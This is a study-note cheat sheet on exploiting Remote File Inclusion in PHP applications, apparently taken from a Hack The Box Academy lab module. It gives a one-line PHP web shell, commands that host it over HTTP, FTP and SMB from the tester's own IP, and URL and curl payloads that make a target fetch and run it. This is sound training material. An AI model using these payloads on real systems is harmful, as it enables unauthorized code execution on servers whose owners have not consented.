# Remote File Inclusion (RFI) - [LINK](https://academy.hackthebox.com/app/module/23/section/254)

Remote File Inclusion (RFI) occurs when a vulnerable function allows the inclusion of remote URLs. This enables attackers to enumerate local-only ports/services (SSRF) or execute malicious scripts hosted on attacker-controlled servers (RCE).

## 1. Verifying RFI Vulnerability

Not all LFIs are RFIs. RFI requires specific function capabilities (e.g., PHP's `include()`) and server configurations (e.g., `allow_url_include = On` in PHP).

* **Configuration Check (PHP):** Read `php.ini` via LFI to check if remote inclusion is enabled.
```bash
echo '<BASE64_STRING_FROM_OUTPUT>' | base64 -d | grep allow_url_include

```


* **Reliable RFI Test:** Attempt to include a local URL to bypass potential outbound firewall rules. If the page renders the target application, it is vulnerable to RFI.
* **Payload:** `[http://127.0.0.1:80/index.php](http://127.0.0.1:80/index.php)`
* **Example URL:** `http://<SERVER_IP>:<PORT>/index.php?language=[http://127.0.0.1:80/index.php](http://127.0.0.1:80/index.php)`



## 2. Remote Code Execution (RCE) via RFI

To achieve RCE, you must host a malicious script in the target application's language (e.g., PHP) and include it via the vulnerability.

**Step 1: Create a PHP Web Shell**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

```

**Step 2: Host and Execute (Three Methods)**

### A. HTTP Hosting

Host the payload on a common port (like 80 or 443) to bypass outbound firewall restrictions.

* **Start Server:**
```bash
sudo python3 -m http.server 80

```


* **Execution Payload:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:80/shell.php&cmd=id

```



### B. FTP Hosting

Useful if HTTP ports are blocked or if the string `http://` is flagged by a Web Application Firewall (WAF).

* **Start Server (using Python's pyftpdlib):**
```bash
sudo python -m pyftpdlib -p 21

```


* **Execution Payload (Anonymous):**
```text
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

```


* **Execution Payload (Authenticated):**
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'

```



### C. SMB Hosting (Windows Targets)

If the target is a Windows server, **`allow_url_include` does not need to be enabled**. Windows treats remote SMB shares as normal file paths (UNC paths). *Note: This often requires being on the same local network, as SMB over the internet is usually blocked.*

* **Start Server (using Impacket):**
```bash
impacket-smbserver -smb2support share $(pwd)

```


* **Execution Payload:**
```text
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami

```
